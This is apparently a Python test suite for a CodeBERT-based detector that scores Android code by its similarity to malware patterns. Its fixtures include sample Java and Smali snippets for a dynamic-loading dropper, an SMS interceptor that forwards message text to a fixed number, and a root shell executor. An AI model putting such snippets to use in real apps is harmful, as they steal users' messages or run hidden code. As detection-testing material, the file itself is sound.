"""Unit and integration tests for CodeBERT (microsoft/codebert-base) Suspicious Code Similarity Analyzer."""

import pytest
from fastapi.testclient import TestClient

from backend.app.static_analysis.codebert_analyzer import (
    CodeBERTSimilarityAnalyzer,
    get_codebert_analyzer,
    REFERENCE_PATTERNS,
)
from backend.main import app


@pytest.fixture
def client():
    return TestClient(app)


@pytest.fixture
def analyzer():
    return get_codebert_analyzer()


def test_codebert_singleton():
    """Verify singleton accessor returns the exact same instance."""
    a1 = get_codebert_analyzer()
    a2 = get_codebert_analyzer()
    assert a1 is a2
    assert isinstance(a1, CodeBERTSimilarityAnalyzer)


def test_reference_patterns_catalog():
    """Verify the reference patterns catalog contains necessary metadata and signatures."""
    assert len(REFERENCE_PATTERNS) >= 8
    for pat in REFERENCE_PATTERNS:
        assert "id" in pat
        assert "name" in pat
        assert "category" in pat
        assert "severity" in pat
        assert "description" in pat
        assert "java_reference" in pat
        assert "smali_reference" in pat


def test_codebert_suspicious_dynamic_loader_match(analyzer):
    """Test semantic similarity matching on dynamic class loading snippet."""
    dynamic_loading_snippet = """
    public void executeDownloadedDex(Context ctx, String dexPath) {
        File optDir = ctx.getDir("outdex", 0);
        DexClassLoader cl = new DexClassLoader(dexPath, optDir.getAbsolutePath(), null, ctx.getClassLoader());
        try {
            Class<?> c = cl.loadClass("com.payload.HiddenPayload");
            Method run = c.getMethod("run");
            run.invoke(null);
        } catch (Exception e) {}
    }
    """
    matches = analyzer.analyze_snippet(
        dynamic_loading_snippet,
        context_meta={"class_name": "com.example.Dropper", "file_path": "com/example/Dropper.java", "line_number": 42}
    )
    assert isinstance(matches, list)
    assert len(matches) > 0

    pattern_ids = [m["pattern_id"] for m in matches]
    assert "REF-DYN-LOAD-01" in pattern_ids
    dyn_match = next(m for m in matches if m["pattern_id"] == "REF-DYN-LOAD-01")
    assert dyn_match["category"] == "Dropper / Dynamic Loading"
    assert dyn_match["confidence_score"] >= 0.60
    assert "Dropper" in dyn_match["evidence"]["class_name"]
    assert "disclaimer" in dyn_match
    assert "malware classification" in dyn_match["disclaimer"].lower()


def test_codebert_sms_exfiltration_match(analyzer):
    """Test semantic similarity matching on SMS interception and exfiltration snippet."""
    sms_snippet = """
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        Object[] pdus = (Object[]) bundle.get("pdus");
        SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdus[0]);
        String text = msg.getMessageBody();
        SmsManager manager = SmsManager.getDefault();
        manager.sendTextMessage("+19995551234", null, text, null, null);
    }
    """
    matches = analyzer.analyze_snippet(
        sms_snippet,
        context_meta={"class_name": "SmsReceiver", "file_path": "com/app/SmsReceiver.java", "line_number": 15}
    )
    assert len(matches) > 0
    pattern_ids = [m["pattern_id"] for m in matches]
    assert "REF-SMS-EXFIL-02" in pattern_ids

    sms_match = next(m for m in matches if m["pattern_id"] == "REF-SMS-EXFIL-02")
    assert sms_match["category"] == "SMS Fraud / Banking Trojan"
    assert sms_match["confidence_score"] >= 0.60


def test_codebert_shell_exec_match(analyzer):
    """Test semantic similarity matching on root shell execution snippet."""
    shell_snippet = """
    public static void runRootCmd(String cmd) {
        Process p = Runtime.getRuntime().exec("/system/bin/sh");
        DataOutputStream os = new DataOutputStream(p.getOutputStream());
        os.writeBytes("su -c " + cmd + "\\n");
        os.flush();
    }
    """
    matches = analyzer.analyze_snippet(
        shell_snippet,
        context_meta={"class_name": "RootUtils", "file_path": "com/app/RootUtils.java", "line_number": 10}
    )
    assert len(matches) > 0
    pattern_ids = [m["pattern_id"] for m in matches]
    assert "REF-SHELL-EXEC-03" in pattern_ids


def test_codebert_smali_compatibility(analyzer):
    """Test that Smali bytecode is supported and evaluated accurately."""
    smali_snippet = """
    .method public static execute(Ljava/lang/String;)V
        .registers 3
        invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
        move-result-object v0
        const-string v1, "/system/bin/sh"
        invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
        move-result-object v0
        return-void
    .end method
    """
    matches = analyzer.analyze_snippet(
        smali_snippet,
        context_meta={"class_name": "SmaliHelper", "file_path": "smali/SmaliHelper.smali", "line_number": 1}
    )
    assert len(matches) > 0
    matched_ids = [m["pattern_id"] for m in matches]
    assert "REF-SHELL-EXEC-03" in matched_ids


def test_codebert_benign_code_discrimination(analyzer):
    """Verify benign helper code produces lower or negative similarity to exploit patterns."""
    benign_code = """
    public static int calculateFibonacci(int n) {
        if (n <= 1) return n;
        return calculateFibonacci(n - 1) + calculateFibonacci(n - 2);
    }
    """
    matches = analyzer.analyze_snippet(
        benign_code,
        context_meta={"class_name": "MathUtils", "file_path": "com/app/MathUtils.java", "line_number": 5}
    )
    # Either no matches meet the threshold, or top score is significantly lower than exploit matches
    if matches:
        assert matches[0]["confidence_score"] < 0.70


def test_codebert_batch_analysis(analyzer):
    """Test batch analysis and metadata summary."""
    snippets = [
        {
            "code": "DexClassLoader loader = new DexClassLoader(path, opt, null, cl); loader.loadClass(\"p\");",
            "class_name": "Loader1",
            "file_path": "Loader1.java",
            "line_number": 12,
        },
        {
            "code": "SmsManager.getDefault().sendTextMessage(\"123\", null, \"msg\", null, null);",
            "class_name": "Sms1",
            "file_path": "Sms1.java",
            "line_number": 20,
        },
    ]
    batch_result = analyzer.analyze_snippets_batch(snippets)
    assert "status" in batch_result
    assert "model" in batch_result
    assert batch_result["total_snippets_analyzed"] == 2
    assert "matches" in batch_result
    assert "disclaimer" in batch_result
    assert "malware classification" in batch_result["disclaimer"].lower()


def test_codebert_fallback_engine():
    """Verify graceful fallback operates if model fails or is placed in fallback mode."""
    fallback_analyzer = CodeBERTSimilarityAnalyzer(model_name="non-existent/fake-model")
    # Force fallback mode
    fallback_analyzer._fallback_mode = True
    fallback_analyzer._initialized = True
    fallback_analyzer._fallback_reason = "Mocked offline error"

    res = fallback_analyzer.analyze_snippet(
        "DexClassLoader loader = new DexClassLoader(a, b, c, d);",
        context_meta={"class_name": "FallbackClass", "file_path": "FallbackClass.java", "line_number": 1}
    )
    assert isinstance(res, list)
    if res:
        assert "disclaimer" in res[0]


def test_codebert_similarity_api_endpoint(client):
    """Test the POST /api/static-analysis/codebert-similarity REST endpoint."""
    code_payload = {
        "code": """
        DexClassLoader dcl = new DexClassLoader(dex, opt, null, parent);
        Class c = dcl.loadClass("com.target.Runner");
        c.getMethod("exec").invoke(null);
        """,
        "class_name": "TestClass",
        "file_path": "com/test/TestClass.java",
        "line_number": 10,
    }
    response = client.post("/api/static-analysis/codebert-similarity", json=code_payload)
    assert response.status_code == 200
    data = response.json()
    assert "status" in data
    assert "model" in data
    assert "matches" in data
    assert "disclaimer" in data
    assert data["matches_found"] > 0
    pattern_ids = [m["pattern_id"] for m in data["matches"]]
    assert "REF-DYN-LOAD-01" in pattern_ids
